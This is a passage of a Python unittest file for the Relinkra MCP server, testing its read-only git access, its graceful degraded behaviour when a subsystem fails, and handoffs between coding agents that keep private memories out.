        self.ok("context_get", task="auth", include_git=True)
        self.ok("handoff_create", source_agent="a", task="t")
        self.ok("git_context", file="README.md")
        self.ok("health")
        self.assertTrue(self.git.calls)
        self.assertLessEqual(
            set(self.git.calls), self.READ_ONLY_GIT_METHODS
        )

    def test_real_git_service_exposes_no_mutating_verb(self):
        """The engine itself offers no write operation to call."""
        from relinkra.git_intelligence import GitIntelligenceService

        public = {
            name
            for name in dir(GitIntelligenceService)
            if not name.startswith("_") and callable(
                getattr(GitIntelligenceService, name)
            )
        }
        # Everything the engine exposes either reads facts (collect_*) or
        # touches only in-process state. `reset_probe_cache` clears a
        # memoised version probe; it runs no git command at all.
        non_repository_methods = {"reset_probe_cache"}
        unexpected = {
            name
            for name in public
            if not name.startswith("collect_")
            and name not in non_repository_methods
        }
        self.assertEqual(
            unexpected,
            set(),
            f"git engine grew a non-collect public method: {unexpected}",
        )

    def test_git_context_reports_state(self):
        payload = self.ok("git_context")
        self.assertTrue(payload["available"])
        self.assertEqual(payload["repository_state"]["branch"], "main")
        self.assertEqual(payload["explain"]["freshness"]["state"], "fresh")
        self.assertTrue(payload["explain"]["trust"]["advisory_only"])


class DegradedModeTests(unittest.TestCase):
    """One failing subsystem must never break an unrelated tool."""

    def _server(self, *, store=None, git_service=None, workspace_root=None):
        env = Env(seed=True)
        self.addCleanup(env.cleanup)
        services = RelinkraServices(
            config=ServiceConfig(
                registry_path=env.registry_path,
                default_project_id=env.project_id,
                default_workspace_id=env.workspace_id,
                workspace_root=workspace_root,
            ),
            store=store if store is not None else env.store,
            registry=env.registry,
            git_service=git_service or RecordingGitService(),
            clock=lambda: FIXED_NOW,
        )
        return MCPServer(services), env

    def _call(self, server, name, **arguments):
        return server.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": name, "arguments": arguments},
            }
        )["result"]

    def test_engram_down_still_answers_health(self):
        server, _ = self._server(store=BrokenStore())
        result = self._call(server, "health")
        self.assertFalse(result["isError"])
        payload = result["structuredContent"]
        self.assertEqual(payload["status"], "degraded")
        self.assertIn("engram", payload["degraded"])
        self.assertFalse(payload["components"]["engram"]["available"])

    def test_engram_down_still_answers_project_resolve(self):
        """Identity comes from the registry, not from memory."""
        server, env = self._server(store=BrokenStore())
        result = self._call(server, "project_resolve")
        self.assertFalse(result["isError"])
        self.assertEqual(
            result["structuredContent"]["project_id"], env.project_id
        )

    def test_engram_down_degrades_memory_search_typed(self):
        server, _ = self._server(store=BrokenStore())
        result = self._call(server, "memory_search")
        self.assertTrue(result["isError"])
        self.assertEqual(
            result["structuredContent"]["error"]["code"], "unavailable"
        )

    def test_engram_down_still_answers_git_context(self):
        server, _ = self._server(store=BrokenStore(), workspace_root=".")
        result = self._call(server, "git_context")
        self.assertFalse(result["isError"])
        self.assertTrue(result["structuredContent"]["available"])

    def test_git_down_still_answers_context_get(self):
        server, _ = self._server(
            git_service=RecordingGitService(fail=True), workspace_root="."
        )
        result = self._call(
            server, "context_get", task="auth", include_git=True
        )
        self.assertFalse(result["isError"])
        self.assertIn("packet", result["structuredContent"])

    def test_git_down_reports_typed_unavailability(self):
        server, _ = self._server(
            git_service=RecordingGitService(fail=True), workspace_root="."
        )
        result = self._call(server, "git_context")
        self.assertFalse(result["isError"])
        payload = result["structuredContent"]
        self.assertFalse(payload["available"])
        self.assertTrue(payload["warnings"])
        self.assertEqual(payload["explain"]["freshness"]["state"], "unknown")

    def test_git_down_still_creates_a_handoff(self):
        server, _ = self._server(
            git_service=RecordingGitService(fail=True), workspace_root="."
        )
        result = self._call(
            server,
            "handoff_create",
            source_agent="opencode",
            task="ship it",
        )
        self.assertFalse(result["isError"])
        payload = result["structuredContent"]
        self.assertTrue(payload["warnings"])
        self.assertIsNone(payload["handoff"]["git_state"]["head_sha"])

    def test_no_workspace_root_degrades_git_only(self):
        server, _ = self._server(workspace_root=None)
        git = self._call(server, "git_context")
        self.assertFalse(git["structuredContent"]["available"])
        self.assertEqual(
            git["structuredContent"]["explain"]["freshness"]["state"],
            "unknown",
        )
        memory = self._call(server, "memory_search")
        self.assertFalse(memory["isError"])

    def test_unexpected_git_fault_degrades_read_surfaces_without_leaking(self):
        server, env = self._server(
            git_service=ExplodingGitService(), workspace_root="."
        )
        env.save(
            memory_type="discovery",
            title="Revision-bound discovery",
            body="bounded",
            commit_sha="a" * 40,
        )
        created = self._call(
            server,
            "handoff_create",
            source_agent="opencode",
            task="fault isolation",
            include_git_state=False,
        )
        self.assertFalse(created["isError"])
        handoff_id = created["structuredContent"]["handoff"]["handoff_id"]

        memory = self._call(
            server, "memory_search", query="Revision-bound"
        )
        handoff = self._call(
            server, "handoff_get", handoff_id=handoff_id
        )
        code = self._call(server, "code_resolve", file="src/auth.py")
        context = self._call(server, "context_get", task="auth")
        git = self._call(server, "git_context")

        for result in (memory, handoff, code, context, git):
            self.assertFalse(result["isError"])
            rendered = json.dumps(result["structuredContent"], sort_keys=True)
            self.assertNotIn("private-token", rendered)
            self.assertNotIn("C:\\\\Users", rendered)
        explained = memory["structuredContent"]["memories"][0]["explain"]
        self.assertEqual(explained["freshness"]["state"], "unknown")
        self.assertEqual(
            git["structuredContent"]["explain"]["freshness"]["state"],
            "unknown",
        )
        self.assertIn(
            "git_unavailable",
            [w["code"] for w in code["structuredContent"]["warnings"]],
        )

    def test_requested_git_state_never_vanishes_silently(self):
        """Asking for git state and getting none must be explained."""
        server, _ = self._server(workspace_root=None)
        result = self._call(
            server,
            "handoff_create",
            source_agent="opencode",
            task="no root configured",
            include_git_state=True,
        )
        self.assertFalse(result["isError"])
        payload = result["structuredContent"]
        self.assertIsNone(payload["handoff"]["git_state"]["head_sha"])
        self.assertIn(
            "git_unavailable", [w["code"] for w in payload["warnings"]]
        )

    def test_cbm_probe_reports_that_it_is_not_liveness_checked(self):
        server, _ = self._server()
        health = self._call(server, "health")["structuredContent"]
        cbm = health["components"]["cbm"]
        self.assertFalse(cbm["available"])
        self.assertTrue(cbm["checked"])

    def test_missing_registry_degrades_without_crashing(self):
        env = Env(seed=True)
        self.addCleanup(env.cleanup)
        services = RelinkraServices(
            config=ServiceConfig(
                registry_path="does/not/exist.json",
                default_project_id=env.project_id,
            ),
            store=env.store,
            git_service=RecordingGitService(),
            clock=lambda: FIXED_NOW,
        )
        server = MCPServer(services)
        health = self._call(server, "health")
        self.assertFalse(health["isError"])
        self.assertIn("registry", health["structuredContent"]["degraded"])
        # A write needs a registered identity and must fail typed.
        saved = self._call(
            server, "memory_save", memory_type="decision", title="t"
        )
        self.assertTrue(saved["isError"])
        self.assertEqual(
            saved["structuredContent"]["error"]["code"], "not_found"
        )


class CrossAgentMCPTests(MCPTestCase):
    """Two independent servers over one shared project store."""

    def _peer(self):
        return MCPServer(
            RelinkraServices(
                config=ServiceConfig(
                    registry_path=self.env.registry_path,
                    default_project_id=self.env.project_id,
                    default_workspace_id=self.env.workspace_id,
                ),
                store=self.env.store,
                registry=self.env.registry,
                git_service=RecordingGitService(),
                clock=lambda: FIXED_NOW,
            )
        )

    def _peer_call(self, server, name, **arguments):
        result = server.handle_message(
            {
                "jsonrpc": "2.0",
                "id": 9,
                "method": "tools/call",
                "params": {"name": name, "arguments": arguments},
            }
        )["result"]
        self.assertFalse(result["isError"], result["content"][0]["text"])
        return result["structuredContent"]

    def test_opencode_to_claude_over_mcp(self):
        created = self.ok(
            "handoff_create",
            source_agent="opencode",
            target_agent="claude",
            task="Finish the budget accountant",
            completed_work=["ladder implemented"],
            pending_work=["docs"],
            include_git_state=False,
        )["handoff"]
        claude = self._peer()
        inbox = self._peer_call(
            claude, "handoff_get", target_agent="claude"
        )
        self.assertEqual(inbox["count"], 1)
        self.assertEqual(inbox["handoffs"][0]["handoff_id"], created["handoff_id"])
        self.assertEqual(inbox["handoffs"][0]["pending_work"], ["docs"])

    def test_claude_to_codex_over_mcp(self):
        claude = self._peer()
        created = self._peer_call(
            claude,
            "handoff_create",
            source_agent="claude",
            target_agent="codex",
            task="Write the regression suite",
            include_git_state=False,
        )["handoff"]
        codex = self._peer()
        fetched = self._peer_call(
            codex, "handoff_get", handoff_id=created["handoff_id"]
        )["handoff"]
        self.assertEqual(fetched["source_agent"], "claude")
        self.assertEqual(fetched["target_agent"], "codex")

    def test_superseded_handoff_stays_queryable(self):
        first = self.ok(
            "handoff_create",
            source_agent="opencode",
            task="Stage one",
            include_git_state=False,
        )["handoff"]
        second = self.ok(
            "handoff_create",
            source_agent="opencode",
            task="Stage one",
            summary="revised",
            supersedes=first["handoff_id"],
            include_git_state=False,
        )["handoff"]
        self.assertEqual(second["supersedes"], first["handoff_id"])
        still_there = self.ok(
            "handoff_get", handoff_id=first["handoff_id"]
        )["handoff"]
        self.assertEqual(still_there["handoff_id"], first["handoff_id"])

    def test_duplicate_handoff_over_mcp_is_deduplicated(self):
        args = dict(
            source_agent="opencode",
            task="Idempotent work",
            include_git_state=False,
        )
        first = self.ok("handoff_create", **args)
        second = self.ok("handoff_create", **args)
        self.assertFalse(first["deduplicated"])
        self.assertTrue(second["deduplicated"])
        self.assertEqual(
            first["handoff"]["handoff_id"], second["handoff"]["handoff_id"]
        )

    def test_agent_private_reference_never_crosses_the_handoff(self):
        private = self.env.save(
            memory_type="discovery",
            title="private note",
            body="do-not-share",
            scope="agent_private",
            agent_type="opencode",
        )
        created = self.ok(
            "handoff_create",
            source_agent="opencode",
            target_agent="claude",
            task="Leaky handoff",
            related_memory_ids=[private.memory_id],
            include_git_state=False,
        )
        self.assertEqual(created["handoff"]["related_memory_ids"], [])
        claude = self._peer()
        fetched = self._peer_call(
            claude,
            "handoff_get",
            handoff_id=created["handoff"]["handoff_id"],
        )
        self.assertNotIn(private.memory_id, json.dumps(fetched))
        self.assertNotIn("do-not-share", json.dumps(fetched))


if __name__ == "__main__":
    unittest.main()
